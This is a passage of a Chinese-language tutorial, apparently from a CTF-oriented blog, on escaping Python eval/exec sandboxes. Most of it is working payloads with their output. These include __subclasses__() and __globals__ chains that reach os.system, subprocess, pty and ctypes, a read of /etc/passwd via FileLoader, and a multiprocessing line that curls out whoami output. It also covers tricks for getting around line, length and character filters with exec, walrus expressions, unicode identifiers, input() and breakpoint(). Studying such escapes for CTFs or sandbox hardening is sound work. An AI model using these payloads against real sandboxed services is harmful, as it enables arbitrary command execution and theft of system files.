<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>(__builtins__) <span class="keyword">is</span> module   <span class="comment"># True</span></span><br><span class="line">__builtins__.__loader__        <span class="comment"># OK</span></span><br><span class="line">__builtins__[<span class="string">&quot;__loader__&quot;</span>]     <span class="comment"># TypeError: module is not subscriptable</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>exec(code, globals, locals)</code> 等“沙箱”执行（你“里面”的环境）</strong><br> 如果 <code>globals</code> 里<strong>没有</strong> key <code>&#39;__builtins__&#39;</code>，Python 会<strong>自动塞入 <code>builtins.__dict__</code>（一个 dict）</strong>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(type(__builtins__))&quot;</span>, &#123;&#125;)  <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 这是字典 → 可以下标访问：</span></span><br><span class="line">__builtins__[<span class="string">&quot;__loader__&quot;</span>]             <span class="comment"># OK（等价于 builtins.__dict__[&#x27;__loader__&#x27;]</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>这就是为什么<strong>在沙箱里 <code>__builtins__[&quot;__loader__&quot;]</code> 可用</strong>，而<strong>在普通脚本里同样写法会报 TypeError</strong>：前者是 <code>dict</code>，后者是模块。</p>

    </div>
  </div>

<h4 id="os-模块-2"><a href="#os-模块-2" class="headerlink" title="os 模块"></a>os 模块</h4><p>而 <code>os._wrap_close</code> 类本身位于系统模块中，因此可以直接通过该类所在模块的全局命名空间直接找到 <code>system</code> 函数执行命令。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h4 id="sys-模块-1"><a href="#sys-模块-1" class="headerlink" title="sys 模块"></a>sys 模块</h4><p><code>sys.modules</code> 是 Python 运行时的一个 <strong>全局字典</strong>，用来<strong>缓存所有已经导入的模块对象</strong>。它是 Python <strong>import 机制的核心缓存</strong>，所有模块导入都会经过它。</p>
<blockquote>
<p><code>sys.modules</code> 的作用是<strong>缓存已加载的模块</strong>。当你第一次 <code>import</code> 一个模块时，Python 会加载并执行该模块的代码，然后将模块对象保存到 <code>sys.modules</code> 中。以后再导入同名模块时，Python 会直接从 <code>sys.modules</code> 里取出已有的模块对象，而不会再次加载和执行模块代码。</p>
</blockquote>
<p><code>sys.modules</code> 是字典类型，其中：</p>
<ul>
<li><strong>键（key）</strong>：模块名（字符串，比如 <code>&#39;os&#39;</code>、<code>&#39;sys&#39;</code>）</li>
<li><strong>值（value）</strong>：模块对象本身</li>
</ul>
<p>因此如果我们能够从全局空间中找到 <code>sys</code> 模块也就找到了 <code>modules</code> 全局字典，进而找到所有的模块。这里还是以 <code>warnings.catch_warnings</code> 为例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="常用-payload"><a href="#常用-payload" class="headerlink" title="常用 payload"></a>常用 payload</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure></div>

<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h1 id="绕过多行限制"><a href="#绕过多行限制" class="headerlink" title="绕过多行限制"></a>绕过多行限制</h1><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用。例如 <code>eval</code>，中间如果存在 <code>;</code> 或者换行会报错。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>exec 可以支持换行符与 <code>;</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p><code>compile</code> 在 <code>single</code> 模式下也同样可以使用 <code>\n</code> 进行换行, 在 <code>exec</code>  模式下可以直接执行多行代码.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h2><p>海象表达式（<code>:=</code>）是 Python 3.8 引入的一种新的语法特性，它能在<strong>一个表达式里</strong>先把右边算好的值<strong>赋给一个变量</strong>，<strong>同时</strong>这个表达式本身的值也就是那个值，也就是在逻辑运算中可以使用赋值操作。例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (chunk := f.read(<span class="number">1024</span>)) != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">    process(chunk)</span><br></pre></td></tr></table></figure></div>

<p>因为海象表达式需要<strong>先把右边算好值</strong>，而列表需要从左到右依次处理，因此我们可以借助<strong>海象表达式</strong>和过<strong>列表</strong>来执行多行代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>也就是说：</p>
<ul>
<li>海象表达式保证语句会执行。</li>
<li>列表保证语句执行顺序。</li>
</ul>
<h1 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h1><p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div>

<p>这行代码的意思是：</p>
<ol>
<li>用户输入一段字符串（比如 <code>help()</code>）。</li>
<li><code>.lower()</code> → 转成小写（<code>help()</code> → <code>help()</code>）。</li>
<li><code>re.sub(r&#39;[a-z0-9]&#39;, &#39;&#39;, ...)</code> → 删除所有小写字母和数字（<code>help()</code> → <code>()</code>）。</li>
<li>结果字符串被 <code>[:130]</code> 截断到 130 个字符以内。</li>
<li><code>eval()</code> 执行这个字符串。</li>
</ol>
<h2 id="替换函数名称"><a href="#替换函数名称" class="headerlink" title="替换函数名称"></a>替换函数名称</h2><p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br></pre></td></tr></table></figure></div>

<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)</span></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)</span></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ğ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Õ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure></div>

<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号，这种情况下，我们可以添加一个 <code>exec</code>。然后将 <code>ord</code> 以及不变的 <code>a(&#39;ō&#39;)</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 <code>lower()</code> 时会发生变化，避免 <code>lower</code> 产生干扰，可以在选取 unicode 时选择 <code>ord</code> 值更大的字符，例如 <code>chr(4434)</code>。</p>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<h2 id="打开-input-输入"><a href="#打开-input-输入" class="headerlink" title="打开 input 输入"></a>打开 input 输入</h2><p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())</span><br></pre></td></tr></table></figure></div>

<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>Python 2 的 <code>input()</code> &#x3D; Python 3 的 <code>eval(input())</code>，在 Py2 里 <code>input()</code> 自带执行功能，<code>raw_input()</code> 才是安全的读取字符串方法。</p>

    </div>
  </div>

<p>下面是一些其他的打开输入流的方式：</p>
<h3 id="sys-stdin-read"><a href="#sys-stdin-read" class="headerlink" title="sys.stdin.read()"></a>sys.stdin.read()</h3><p>注意输入完毕之后按 ctrl+d 结束输入</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">kali</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="sys-stdin-readline"><a href="#sys-stdin-readline" class="headerlink" title="sys.stdin.readline()"></a>sys.stdin.readline()</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="sys-stdin-readlines"><a href="#sys-stdin-readlines" class="headerlink" title="sys.stdin.readlines()"></a>sys.stdin.readlines()</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h2><p><code>breakpoint</code> 是从 Python <strong>3.7</strong> 开始引入的一个内置函数。默认行为：调用 <code>sys.breakpointhook()</code> → 启动 <code>pdb.set_trace()</code>，也就是进入 <strong>Pdb</strong>（Python 调试器）。</p>
<p>在 Pdb 提示符 <code>(Pdb)</code> 里，你可以查看变量、执行表达式，甚至运行任意 Python 语句。在输入 <code>breakpoint()</code> 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码。</p>
